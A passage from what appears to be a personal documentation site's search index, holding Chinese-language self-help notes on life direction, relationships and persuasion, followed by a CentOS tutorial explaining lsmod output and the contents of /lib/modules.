\u4eba\u751f\u7684\u9009\u62e9\u4e0d\u4e00\u5b9a\u5bf9\u793e\u4f1a\u6709\u4ef7\u503c \u6709\u4eba\u89c9\u5f97\u6ca1\u6709\u9009\u62e9 \u4eba\u751f\u4e4b\u8def\u4e0d\u4e00\u5b9a\u80fd\u8d5a\u94b1","title":"\u4e94\u4e2a\u8bef\u533a\uff1a"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#_4","text":"\u4ece\u4ee5\u4e94\u4e2a\u95ee\u9898\u4e2d\u603b\u7ed3\u51fa\u6838\u5fc3\u3001\u91cd\u590d\u7684\u4e1c\u897f\uff1a \u4f60\u6709\u5c0a\u656c\u7684\u4eba\u561b\uff1f\u6216\u8005\u5d07\u62dc\u7684\u4eba\uff1f\u4f60\u4e3a\u4ec0\u4e48\u5c0a\u656c\u4ed6\uff1f\u4f60\u4e3a\u4ec0\u4e48\u5d07\u62dc\u4ed6\uff1f\u559c\u6b22\u4ed6\u4ec0\u4e48\u5730\u65b9\uff1f \u4f60\u5728\u9752\u6625\u671f\u6216\u8005\u4eba\u751f\u6700\u6d3b\u8dc3\u7684\u65f6\u671f\uff0c\u662f\u5426\u6709\u5bf9\u4f60\u5f71\u54cd\u5f88\u5927\u7684\u4e8b\u60c5\uff1f\u90a3\u4ef6\u4e8b\u60c5\u5f71\u54cd\u4e86\u4f60\u7684\u4eba\u751f\u8f68\u8ff9\u6216\u8005\u5bf9\u4f60\u7684\u4eba\u751f\u89c2\u3001\u4ef7\u503c\u89c2\u6709\u51b2\u51fb\u7684\u5730\u65b9 \u73b0\u5728\u7684\u793e\u4f1a\u6709\u4ec0\u4e48\u4e0d\u8db3\u7684\u5730\u65b9\uff1f \u5728\u670b\u53cb\u773c\u91cc\uff0c\u4f60\u662f\u4e00\u4e2a\u770b\u4e2d\u4ec0\u4e48\u4e1c\u897f\u7684\u4eba\uff1f \u4f1a\u7ed9\u522b\u4eba\u7684\u5efa\u8bae\u662f\u4ec0\u4e48\uff1f\u4e0d\u5e0c\u671b\u670b\u53cb\u7ed9\u6211\u4ec0\u4e48\u5efa\u8bae\uff1f","title":"\u4ef7\u503c\u89c2"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#-","text":"\u200b \u4e24\u4e2a\u8bef\u533a\uff1a \u559c\u6b22\u4e0d\u662f\u5929\u8d4b \u6280\u672f\u548c\u64c5\u957f\u4e0d\u662f\u5929\u8d4b\uff0c\u4f8b\u5982\u957f\u5f97\u597d\u770b\u3001\u4e50\u611f\u3001\u8eab\u6750\u6bd4\u4f8b\u3001\u8bb0\u5fc6\u529b\uff0c\u4ece\u6765\u4e0d\u62c9\u809a\u5b50\u3001\u5343\u676f\u4e0d\u5012\u8fd9\u90fd\u662f\u5929\u8d4b\uff0c\u7f3a\u70b9\u53e6\u4e00\u4e2a\u89d2\u5ea6\u770b\u4e5f\u662f\u957f\u5904 \u200b \u4ece\u4ee5\u4e94\u4e2a\u95ee\u9898\u4e2d\u603b\u7ed3\u51fa\u6838\u5fc3\u3001\u91cd\u590d\u7684\u4e1c\u897f\uff1a \u76ee\u524d\u4eba\u751f\u6700\u5145\u5b9e\u7684\u7ecf\u5386\u662f\u4ec0\u4e48\uff1f\u7279\u522b\u6709\u5e72\u52b2\uff0c\u5145\u6ee1\u7cbe\u529b\uff0c\u975e\u5e38\u987a\u5229\u7684\u65f6\u671f \u6700\u8fd1\u4e00\u6b21\u8ba9\u4f60\u4e0d\u8010\u70e6\u7684\u4e8b\u60c5\u662f\u4ec0\u4e48\uff1f \u95ee\u8eab\u8fb9\u7684\u4eba\u81ea\u5df1\u64c5\u957f\u4ec0\u4e48\uff1f \u653e\u5f03\u73b0\u5728\u7684\u5de5\u4f5c\u7279\u522b\u60f3\u505a\u7684\u4e8b\u60c5\uff1f \u76ee\u524d\u4e3a\u6b62\u6210\u529f\u7684\u4e8b\u60c5\uff1f\u4f8b\u5982\u6210\u7ee9\u597d\uff0c\u8dd1\u7684\u5feb","title":"\u5929\u8d4b---\u4f60\u7684\u8bf4\u660e\u4e66"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#_5","text":"\u200b \u68a6\u60f3\u548c\u613f\u671b\u5e94\u8be5\u662f\u81ea\u5df1\u559c\u6b22\u6216\u8005\u611f\u5174\u8da3\u7684\uff0c\u800c\u4e0d\u662f\u6709\u610f\u4e49\u7684\uff0c\u6ca1\u6709\u610f\u4e49\u4e5f\u559c\u6b22\u624d\u662f\u68a6\u60f3 \u200b \u4ece\u4ee5\u4e94\u4e2a\u95ee\u9898\u4e2d\u603b\u7ed3\u51fa\u6838\u5fc3\u3001\u91cd\u590d\u7684\u4e1c\u897f\uff1a \u4ec0\u4e48\u4e8b\u60c5\u5c31\u7b97\u662f\u82b1\u94b1\u4e5f\u613f\u610f\u53bb\u5b66\uff1f \u4f60\u7684\u4e66\u67b6\u4e0a\u6709\u4ec0\u4e48\u4e66\uff0c\u5bf9\u4ec0\u4e48\u4e1c\u897f\u611f\u5174\u8da3\uff1f \u6709\u6ca1\u6709\u4ec0\u4e48\u5185\u5bb9\u5bf9\u4f60\u5f88\u5927\u5e2e\u52a9\uff1f \u4f60\u6709\u60f3\u8981\u611f\u8c22\u7684\u4eba\u6216\u8005\u4e8b\u60c5\uff1f \u4f60\u5bf9\u8fd9\u4e2a\u4e16\u754c\u6216\u8005\u793e\u4f1a\u6709\u4ec0\u4e48\u4e0d\u6ee1\u7684\u5730\u65b9\u5417\uff1f","title":"\u559c\u6b22\u7684\u4e8b\uff08\u68a6\u60f3\u613f\u671b\uff09"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#_6","text":"\u68a6\u60f3\u548c\u624d\u80fd\u8054\u7cfb\u8d77\u6765\uff0c\u8fd9\u5c31\u662f\u53ef\u80fd\u7684\u4eba\u751f\u65b9\u5411 \u6700\u7ec8\u7684\u9009\u62e9\u4e00\u5b9a\u8981\u7b26\u5408\u4f60\u7684\u4ef7\u503c\u89c2 \u8fd9\u6b21\u9009\u62e9\u4e0d\u662f\u4f60\u7684\u6700\u540e\u4e00\u6b21\u9009\u62e9","title":"\u603b\u7ed3"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#30","text":"","title":"30\u4e2a\u95ee\u9898\uff0c\u627e\u5230\u4ef7\u503c\u89c2"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#30_1","text":"","title":"30\u4e2a\u95ee\u9898\uff0c\u627e\u5230\u5929\u8d4b"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#30_2","text":"","title":"30\u4e2a\u95ee\u9898\uff0c\u627e\u5230\u559c\u6b22\u7684\u4e8b"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#100","text":"","title":"100\u4e2a\u4ef7\u503c\u89c2\u6837\u4f8b"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#100_1","text":"","title":"100\u4e2a\u5929\u8d4b\u6837\u4f8b"},{"location":"soft/%E5%AF%BB%E6%89%BE%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF/#100_2","text":"","title":"100\u4e2a\u559c\u6b22\u6837\u4f8b"},{"location":"soft/%E7%88%B1%E6%83%85/","text":"\u4e0d\u8981\u558b\u558b\u4e0d\u4f11 \u4e0d\u8981\u8bd5\u56fe\u6539\u53d8\u5bf9\u65b9 \u4e0d\u8981\u4e92\u76f8\u6307\u8d23 \u5b66\u4f1a\u4e92\u76f8\u6b23\u8d4f \u7ec6\u5fae\u4e4b\u5904\u4e0d\u53ef\u5ffd\u89c6 \u592b\u59bb\u53cc\u65b9\u8981\u76f8\u656c\u5982\u5bbe \u8bfb\u4e00\u672c\u6027\u7231\u7684\u4e66 \u8bc0\u7a8d\uff1a \u662f\u5426\u8fd8\u8fc7\u7eaa\u5ff5\u65e5\uff0c\u662f\u5426\u8fd8\u51c6\u5907\u793c\u7269 \u4ece\u6765\u4e0d\u5f53\u522b\u4eba\u7684\u9762\u6279\u8bc4\u5979 \u4f1a\u7ed9\u5979\u96f6\u82b1\u94b1 \u4e86\u89e3\u5979\uff0c\u5728\u5979\u60c5\u7eea\u8f6c\u53d8\u7684\u65f6\u5019 \u7559\u4e00\u534a\u7684\u65f6\u95f4\u7ed9\u5979 \u5c3d\u91cf\u4e0d\u8981\u628a\u5979\u548c\u5176\u4ed6\u4eba\u5bf9\u6bd4 \u5bf9\u5979\u793e\u4ea4\u3001\u770b\u7684\u4e66\u3001\u601d\u60f3\u6d3b\u52a8\u611f\u5174\u8da3 \u80fd\u8ba9\u5979\u4e0e\u5176\u4ed6\u7537\u58eb\u516c\u4e8b\uff0c\u63a5\u53d7\u4ed6\u4eec\u7684\u6bb7\u52e4\u3001\u4e0d\u5ac9\u5992 \u5de7\u5999\u7684\u79f0\u8d5e\u5979 \u5979\u4e3a\u81ea\u5df1\u505a\u4e8b\u7684\u65f6\u5019\uff0c\u8bf4\u8c22\u8c22","title":"\u7231\u60c5"},{"location":"soft/%E8%B5%A2%E5%BE%97%E5%88%AB%E4%BA%BA%E7%9A%84%E8%B5%9E%E5%90%8C/","text":"\u907f\u514d\u4e89\u8bba\uff0c\u662f\u8d62\u5f97\u4e89\u8bba\u7684\u552f\u4e00\u65b9\u6cd5 \u4e0d\u8981\u8bf4\u522b\u4eba\u9519\u4e86\uff0c\u5c0a\u91cd\u522b\u7684\u4eba\u89c2\u70b9 \u5766\u8bda\u7684\u627f\u8ba4\u81ea\u5df1\u7684\u9519\u8bef \u53cb\u5584\u662f\u5f00\u542f\u6c9f\u901a\u7684\u6865\u6881 \u8ba9\u5bf9\u65b9\u70b9\u5934\u79f0\u201c\u662f\u201d \u8ba9\u5bf9\u65b9\u6210\u4e3a\u8c08\u8bdd\u7684\u4e3b\u5bfc\u8005 \u5f15\u5bfc\u5bf9\u65b9\u5f97\u51fa\u7684\u7ed3\u8bba \u4ece\u4ed6\u4eba\u7684\u89d2\u5ea6\u770b\u95ee\u9898 \u4f53\u8c05\u4ed6\u4eba \u6fc0\u53d1\u5bf9\u65b9\u7684\u9ad8\u5c1a\u52a8\u673a \u5c06\u4f60\u7684\u60f3\u6cd5\u620f\u5267\u5316\u7684\u5c55\u73b0\u51fa\u6765 \u6fc0\u53d1\u4ed6\u7684\u6311\u6218\u6b32\u671b","title":"\u8d62\u5f97\u522b\u4eba\u7684\u8d5e\u540c"},{"location":"soft/%E9%9A%8F%E4%BE%BF%E8%AE%B0%E8%AE%B0/","text":"\u77e5\u4e0d\u53ef\u4e4e\u9aa4\u5f97\uff0c\u6258\u9057\u54cd\u4e8e\u60b2\u98ce \u4e0d\u77e5\u547d\u65e0\u4ee5\u4e3a\u541b\u5b50\u4e5f \u5e73\u65e5\u4e0d\u4fee\u5584\u679c \u53ea\u7231\u6740\u4eba\u653e\u706b \u5ffd\u5730\u987f\u5f00\u91d1\u7ef3 \u8fd9\u91cc\u626f\u65ad\u7389\u9501 \u94b1\u5858\u6c5f\u4e0a\u6f6e\u4fe1\u6765 \u4eca\u65e5\u65b9\u77e5\u6211\u662f\u6211 \u4fee\u5fc3\u7ec3\u8eab \u76f8\u7231\u4e0d\u9700\u8981\u6280\u5de7\uff0c\u76f8\u5904\u9700\u8981 \u89c1\u5c71\u662f\u5c71\u3002\u89c1\u6c34\u662f\u6c34\u3002\u89c1\u5c71\u4e0d\u662f\u5c71\u3002\u89c1\u6c34\u4e0d\u662f\u6c34\u3002\u89c1\u5c71\u53ea\u662f\u5c71\u3002\u89c1\u6c34\u53ea\u662f\u6c34\u3002 \u4eba\u751f\u7684\u610f\u4e49\u5728\u4e8e\u5c3d\u53ef\u80fd\u591a\u5730\u7ecf\u5386\uff0c\u800c\u4e0d\u662f\u5c3d\u53ef\u80fd\u5c11\u5730\u72af\u9519\u3002 \u5176\u5b9e\u4eba\u751f\u4e2d\u5927\u90e8\u5206\u95ee\u9898\u90fd\u662f\u6ca1\u6709\u6807\u51c6\u7b54\u6848\u7684\uff0c\u5c0f\u7684\u65f6\u5019\u7236\u6bcd\u8bf4\u7684\u5c31\u662f\u6807\u51c6\u7b54\u6848\uff0c\u4e0a\u5b66\u7684\u65f6\u5019\u8001\u5e08\u8bf4\u7684\u5c31\u662f\u6807\u51c6\u7b54\u6848\uff0c\u4e0a\u73ed\u4e86\u8001\u677f\u8bf4\u7684\u5c31\u662f\u6807\u51c6\u7b54\u6848","title":"\u968f\u4fbf\u8bb0\u8bb0"},{"location":"soft/%E9%A2%86%E5%AF%BC%E8%80%85%E5%BF%85%E9%A1%BB%E9%A2%86%E6%82%9F%E7%9A%84/","text":"\u6b32\u626c\u5148\u6291 \u6279\u8bc4\u9700\u8981\u95f4\u63a5\u5730\u8fdb\u884c \u6307\u51fa\u8fc7\u9519\u524d\uff0c\u5148\u627f\u8ba4\u81ea\u5df1\u7684\u4e0d\u8db3 \u4ee5\u8be2\u95ee\u4ee3\u66ff\u547d\u4ee4 \u987e\u5168\u5bf9\u65b9\u7684\u9762\u5b50 \u79f0\u8d5e\u4ed6\u4eba\u7684\u6bcf\u4e00\u70b9\u8fdb\u6b65 \u4ee5\u7f8e\u8a89\u79f0\u8d5e\u4ed6\u4eba\uff0c\u4ed6\u80fd\u56de\u9988\u4f60\u65e0\u9650\u7684\u6f5c\u80fd \u9f13\u52b1\u4ed6\u505a\u51fa\u6539\u53d8 \u8ba9\u5bf9\u65b9\u5fc3\u7518\u60c5\u613f\u7684\u4e3a\u4f60\u505a\u4e8b","title":"\u9886\u5bfc\u8005\u77e5\u6653\u7684"},{"location":"system/","text":"\u6b64\u7ae0\u8282\u8bb0\u5f55Linux\u6027\u80fd\u4f18\u5316\u7684\u76f8\u5173\u77e5\u8bc6","title":"Index"},{"location":"system/centos7/CentOS%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E9%A9%B1%E5%8A%A8/","text":"CentOS\u67e5\u770b\u7cfb\u7edf\u9a71\u52a8 \u8981\u67e5\u770bLinux\u7cfb\u7edf\u4e2d\u9884\u88c5\u7684\u9a71\u52a8\u7a0b\u5e8f\u5217\u8868\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u51e0\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u6709\u4e24\u79cd\u5e38\u7528\u65b9\u6cd5\uff1a 1.\u67e5\u770b\u52a0\u8f7d\u7684\u6a21\u5757\uff1a \u4f7f\u7528 lsmod \u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u5f53\u524d\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757\uff08\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002\u8fd9\u4f1a\u663e\u793a\u5f53\u524d\u4f1a\u8bdd\u4e2d\u5b9e\u9645\u4f7f\u7528\u7684\u6a21\u5757\u3002\u6253\u5f00\u7ec8\u7aef\uff0c\u7136\u540e\u8f93\u5165\uff1a lsmod \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5217\u51fa\u6240\u6709\u5f53\u524d\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757\u4ee5\u53ca\u5b83\u4eec\u7684\u4f9d\u8d56\u5173\u7cfb\u548c\u4f7f\u7528\u72b6\u6001\u3002 \u4f8b\u5982\uff1a [root@VM-0-16-centos ~]# lsmod | nl 1 Module Size Used by 2 binfmt_misc 17468 1 3 tcp_diag 12591 0 4 inet_diag 18949 1 tcp_diag 5 iptable_filter 12810 0 6 nls_utf8 12557 0 7 isofs 43940 0 8 iosf_mbi 15582 0 9 crc32_pclmul 13133 0 10 ghash_clmulni_intel 13273 0 11 ppdev 17671 0 12 aesni_intel 189456 0 13 lrw 13286 1 aesni_intel 14 gf128mul 15139 1 lrw 15 glue_helper 13990 1 aesni_intel 16 ablk_helper 13597 1 aesni_intel 17 cryptd 21190 3 ghash_clmulni_intel,aesni_intel,ablk_helper 18 joydev 17389 0 19 sg 40719 0 20 virtio_balloon 18015 0 21 pcspkr 12718 0 22 parport_pc 28205 0 23 i2c_piix4 22401 0 24 parport 46395 2 ppdev,parport_pc 25 ip_tables 27126 1 iptable_filter 26 ext4 592325 1 27 mbcache 14958 1 ext4 28 jbd2 107486 1 ext4 29 sr_mod 22416 0 30 cdrom 46696 1 sr_mod 31 ata_generic 12923 0 32 pata_acpi 13053 0 33 virtio_net 27994 0 34 net_failover 18147 1 virtio_net 35 virtio_blk 18472 2 36 failover 13374 1 net_failover 37 cirrus 24171 1 38 drm_kms_helper 186531 1 cirrus 39 syscopyarea 12529 1 drm_kms_helper 40 sysfillrect 12701 1 drm_kms_helper 41 sysimgblt 12640 1 drm_kms_helper 42 fb_sys_fops 12703 1 drm_kms_helper 43 ttm 100769 1 cirrus 44 crct10dif_pclmul 14307 0 45 crct10dif_common 12595 1 crct10dif_pclmul 46 crc32c_intel 22094 0 47 ata_piix 35052 0 48 drm 468454 4 ttm,drm_kms_helper,cirrus 49 serio_raw 13434 0 50 libata 247190 3 pata_acpi,ata_generic,ata_piix 51 virtio_pci 22985 0 52 virtio_ring 22991 4 virtio_blk,virtio_net,virtio_pci,virtio_balloon 53 virtio 14959 4 virtio_blk,virtio_net,virtio_pci,virtio_balloon 54 drm_panel_orientation_quirks 17180 1 drm 55 floppy 73520 0 \u8fd9\u4e2a\u547d\u4ee4 lsmod \u5c55\u793a\u7684\u662f\u5f53\u524d\u7cfb\u7edf\u4e0a\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757\uff08\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002\u6bcf\u4e00\u884c\u4ee3\u8868\u4e00\u4e2a\u6a21\u5757\uff0c\u5206\u522b\u5217\u51fa\u4e86\u6a21\u5757\u7684\u540d\u79f0\u3001\u5927\u5c0f\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u4ee5\u53ca\u4f7f\u7528\u5b83\u7684\u5b9e\u4f8b\u6570\u91cf\uff08\u5982\u679c\u6709\u5176\u4ed6\u6a21\u5757\u4f9d\u8d56\u4e8e\u6b64\u6a21\u5757\uff0c\u6216\u8005\u8be5\u6a21\u5757\u6b63\u5728\u88ab\u7cfb\u7edf\u6216\u8bbe\u5907\u4f7f\u7528\uff0c\u8fd9\u4e2a\u6570\u5b57\u5c31\u4f1a\u5927\u4e8e0\uff09\u3002 \u4f8b\u5982\uff0c\u7b2c\u4e00\u884c\u663e\u793a\u4e86 binfmt_misc \u6a21\u5757\uff0c\u5927\u5c0f\u4e3a17468\u5b57\u8282\uff0c\u88ab\u4e00\u4e2a\u5b9e\u4f8b\u4f7f\u7528\u3002\u800c tcp_diag \u6a21\u5757\uff0c\u5927\u5c0f\u4e3a12591\u5b57\u8282\uff0c\u76ee\u524d\u6ca1\u6709\u88ab\u4f7f\u7528\uff08Used by\u4e3a0\uff09\u3002\u5982\u679c\u88ab\u4f7f\u7528\uff0c\u90a3\u4e48\u4f7f\u7528\u65b9\u5c06\u4f1a\u540e\u9762\u663e\u793a \u8fd9\u4e2a\u5217\u8868\u57fa\u672c\u4e0a\u662f\u4f60\u7684\u7cfb\u7edf\u5f53\u524d\u4f7f\u7528\u7684\u6240\u6709\u786c\u4ef6\u548c\u6587\u4ef6\u7cfb\u7edf\u76f8\u5173\u7684\u9a71\u52a8\u7a0b\u5e8f\u7684\u6982\u89c8\u3002\u901a\u8fc7\u8fd9\u4e2a\u5217\u8868\uff0c\u4f60\u53ef\u4ee5\u4e86\u89e3\u54ea\u4e9b\u9a71\u52a8\u7a0b\u5e8f\u5f53\u524d\u5728\u7cfb\u7edf\u4e0a\u6d3b\u8dc3\uff0c\u4ee5\u53ca\u4ed6\u4eec\u7684\u4f7f\u7528\u60c5\u51b5\u3002 \u4f9d\u6b21\u89e3\u91ca\u8fd955\u884c lsmod \u547d\u4ee4\u7684\u8f93\u51fa\u7ed3\u679c\uff1a binfmt_misc - \u652f\u6301\u53ef\u6267\u884c\u6587\u4ef6\u7684\u591a\u79cd\u683c\u5f0f\u3002 tcp_diag - \u7528\u4e8eTCP\u7f51\u7edc\u8bca\u65ad\u3002 inet_diag - \u7f51\u7edc\u8bca\u65ad\u6846\u67b6\uff0c\u7531tcp_diag\u4f7f\u7528\u3002 iptable_filter - Netfilter\u7684IPv4\u8fc7\u6ee4\u89c4\u5219\u8868\u3002 nls_utf8 - \u652f\u6301UTF-8\u7f16\u7801\u3002 isofs - ISO 9660\u6587\u4ef6\u7cfb\u7edf\u652f\u6301\uff0c\u7528\u4e8e\u8bfb\u53d6CD/DVD\u3002 iosf_mbi - \u7528\u4e8eIntel\u5e73\u53f0\u7684\u6d88\u606f\u603b\u7ebf\u63a5\u53e3\u9a71\u52a8\u3002 crc32_pclmul - \u4f7f\u7528PCLMULQDQ\u6307\u4ee4\u7684CRC32\u6821\u9a8c\u3002 ghash_clmulni_intel - AES-GCM\u7684Intel\u786c\u4ef6\u52a0\u901f\u3002 ppdev - \u5e76\u53e3\u8bbe\u5907\u9a71\u52a8\u3002 aesni_intel - Intel AES-NI\u6307\u4ee4\u96c6\u652f\u6301\u3002 lrw - LRW\uff08\u7ebf\u6027\u76f8\u5173-\u4e58\u6cd5\uff09\u5757\u5bc6\u7801\u6a21\u5f0f\u3002 gf128mul - GF(2^128)\u57df\u7684\u4e58\u6cd5\u652f\u6301\u3002 glue_helper - \u7528\u4e8e\u52a0\u5bc6\u7b97\u6cd5\u7684\u5e2e\u52a9\u51fd\u6570\u3002 ablk_helper - \u5f02\u6b65\u5757\u5bc6\u7801\u5e2e\u52a9\u51fd\u6570\u3002 cryptd - \u52a0\u5bc6\u7b97\u6cd5\u7684\u8f6f\u4ef6\u5b9e\u73b0\u3002 joydev - \u6e38\u620f\u624b\u67c4\u8bbe\u5907\u9a71\u52a8\u3002 sg - SCSI\u901a\u7528\uff08sg\uff09\u9a71\u52a8\u3002 virtio_balloon - Virtio\u5185\u5b58\u6c14\u7403\u9a71\u52a8\uff0c\u7528\u4e8e\u8c03\u6574\u865a\u62df\u673a\u7684\u5185\u5b58\u5206\u914d\u3002 pcspkr - PC\u626c\u58f0\u5668\u9a71\u52a8\u3002 parport_pc - PC\u5e76\u53e3\u9a71\u52a8\u3002 i2c_piix4 - AMD/Intel I2C\u603b\u7ebf\u9a71\u52a8\u3002 parport - \u5e76\u884c\u7aef\u53e3\uff08printer port\uff09\u8bbe\u5907\u652f\u6301\u3002 ip_tables - IPv4\u9632\u706b\u5899\uff08Netfilter\uff09\u652f\u6301\u3002 ext4 - EXT4\u6587\u4ef6\u7cfb\u7edf\u9a71\u52a8\u3002 mbcache - EXT\u6587\u4ef6\u7cfb\u7edf\u7684\u5143\u6570\u636e\u7f13\u5b58\u3002 jbd2 - EXT\u6587\u4ef6\u7cfb\u7edf\u7684\u65e5\u5fd7\u5757\u8bbe\u5907\u3002 sr_mod - SCSI CD-ROM\u652f\u6301\u3002 cdrom - \u901a\u7528CD-ROM\u9a71\u52a8\u3002 ata_generic - \u901a\u7528ATA\u9a71\u52a8\u3002 pata_acpi - \u652f\u6301\u901a\u8fc7ACPI\u914d\u7f6ePATA\u63a5\u53e3\u3002 virtio_net - Virtio\u7f51\u7edc\u8bbe\u5907\u9a71\u52a8\u3002 net_failover - \u7f51\u7edc\u6545\u969c\u8f6c\u79fb\u652f\u6301\u3002 virtio_blk - Virtio\u5757\u8bbe\u5907\u9a71\u52a8\u3002 failover - \u901a\u7528\u7f51\u7edc\u6545\u969c\u8f6c\u79fb\u6a21\u5757\u3002 cirrus - Cirrus\u903b\u8f91GPU\u9a71\u52a8\u3002 drm_kms_helper - DRM\uff08\u76f4\u63a5\u6e32\u67d3\u7ba1\u7406\u5668\uff09\u5185\u6838\u6a21\u5f0f\u8bbe\u7f6e\u5e2e\u52a9\u51fd\u6570\u3002 syscopyarea - \u5185\u6838\u5e27\u7f13\u51b2\u590d\u5236\u533a\u57df\u652f\u6301\u3002 sysfillrect - \u5185\u6838\u5e27\u7f13\u51b2\u586b\u5145\u77e9\u5f62\u652f\u6301\u3002 sysimgblt - \u5185\u6838\u5e27\u7f13\u51b2\u56fe\u50cf\u4f4d\u5757\u4f20\u8f93\u652f\u6301\u3002 fb_sys_fops - \u5185\u6838\u5e27\u7f13\u51b2\u7cfb\u7edf\u6587\u4ef6\u64cd\u4f5c\u652f\u6301\u3002 ttm - \u5185\u6838\u7684\u8f6c\u6362\u548c\u7f13\u5b58\u7ba1\u7406\u5668\uff08TTM\uff09\u3002 crct10dif_pclmul - \u4f7f\u7528PCLMULQDQ\u6307\u4ee4\u7684CRC-T10DIF\u6821\u9a8c\u3002 crct10dif_common - CRC-T10DIF\u6821\u9a8c\u901a\u7528\u51fd\u6570\u3002 crc32c_intel - \u4f7f\u7528Intel\u786c\u4ef6\u52a0\u901f\u7684CRC32c\u6821\u9a8c\u3002 ata_piix - Intel PIIX/ICH ATA\u63a7\u5236\u5668\u9a71\u52a8\u3002 drm - \u76f4\u63a5\u6e32\u67d3\u7ba1\u7406\u5668\uff08DRM\uff09\u652f\u6301\u3002 serio_raw - \u539f\u59cb\u4e32\u884cI/O\u63a5\u53e3\u9a71\u52a8\u3002 libata - \u901a\u7528ATA/ATAPI\u9a71\u52a8\u5e93\u3002 virtio_pci - Virtio PCI\u603b\u7ebf\u9a71\u52a8\u3002 virtio_ring - Virtio\u73af\u7f13\u51b2\u533a\u7ba1\u7406\u3002 virtio - Virtio\u6838\u5fc3\u6846\u67b6\u3002 drm_panel_orientation_quirks - \u7528\u4e8e\u7279\u5b9a\u9762\u677f\u7684DRM\u5c4f\u5e55\u65b9\u5411\u95ee\u9898\u4fee\u6b63\u3002 floppy - \u8f6f\u76d8\u9a71\u52a8\u3002 2.\u67e5\u770b\u53ef\u7528\u6a21\u5757\uff1a \u8981\u67e5\u770b\u7cfb\u7edf\u53ef\u7528\u7684\u6240\u6709\u5185\u6838\u6a21\u5757\uff08\u4e0d\u4ec5\u4ec5\u662f\u5f53\u524d\u52a0\u8f7d\u7684\uff09\uff0c\u4f60\u53ef\u4ee5\u5728 /lib/modules/$(uname -r) \u76ee\u5f55\u4e0b\u67e5\u627e\u3002\u8fd9\u91cc\u7684 $(uname -r) \u4f1a\u88ab\u66ff\u6362\u4e3a\u4f60\u5f53\u524d\u8fd0\u884c\u7684\u5185\u6838\u7248\u672c\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a ls /lib/modules/$(uname -r)/kernel/drivers/ \u8fd9\u4e2a\u547d\u4ee4\u5c06\u663e\u793a\u5f53\u524d\u7cfb\u7edf\u7248\u672c\u6240\u6709\u53ef\u7528\u7684\u9a71\u52a8\u7a0b\u5e8f\u6a21\u5757\uff0c\u7ec4\u7ec7\u5728\u4e0d\u540c\u7684\u5b50\u76ee\u5f55\u4e0b\uff0c\u5982 net \uff08\u7f51\u7edc\uff09\u3001 scsi \uff08\u5b58\u50a8\u63a7\u5236\u5668\uff09\u3001 video \uff08\u89c6\u9891\u8bbe\u5907\uff09\u7b49\u3002 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u5c55\u793a\u7684\u662f\u7cfb\u7edf\u4e2d\u53ef\u7528\u6216\u8005\u5df2\u52a0\u8f7d\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4f46\u5e76\u4e0d\u610f\u5473\u7740\u6240\u6709\u8fd9\u4e9b\u9a71\u52a8\u90fd\u662f\u5728\u5185\u6838\u7f16\u8bd1\u65f6\u9884\u88c5\u7684\u3002\u4e00\u4e9b\u9a71\u52a8\u53ef\u80fd\u662f\u5728\u540e\u7eed\u8fc7\u7a0b\u4e2d\u6dfb\u52a0\u7684\uff0c\u5c24\u5176\u662f\u5728\u4f7f\u7528\u5b9a\u5236\u6216\u8005\u7b2c\u4e09\u65b9\u5185\u6838\u65f6\u3002 \u4ee5\u6211\u7684\u817e\u8baf\u4e91\u4e3a\u4f8b\uff1a [root@VM-0-16-centos ~]# ls /lib/modules/$(uname -r) build modules.alias modules.builtin modules.dep.bin modules.modesetting modules.softdep source weak-updates extra modules.alias.bin modules.builtin.bin modules.devname modules.networking modules.symbols updates kernel modules.block modules.dep modules.drm modules.order modules.symbols.bin vdso \u4ee5\u4e0b\u662f\u6bcf\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u8bf4\u660e\uff1a build : \u901a\u5e38\u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u6307\u5411\u5185\u6838\u6e90\u4ee3\u7801\u7684\u4f4d\u7f6e\uff0c\u7528\u4e8e\u7f16\u8bd1\u5185\u6838\u6a21\u5757\u3002 extra : \u7528\u4e8e\u5b58\u653e\u975e\u6807\u51c6\u6216\u7b2c\u4e09\u65b9\u7684\u5185\u6838\u6a21\u5757\u3002 kernel : \u5305\u542b\u4e86\u5927\u91cf\u7684\u5b50\u76ee\u5f55\uff0c\u6bcf\u4e2a\u5b50\u76ee\u5f55\u90fd\u5305\u542b\u7279\u5b9a\u7c7b\u578b\u7684\u5185\u6838\u6a21\u5757\uff08\u5982\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002 modules.alias : 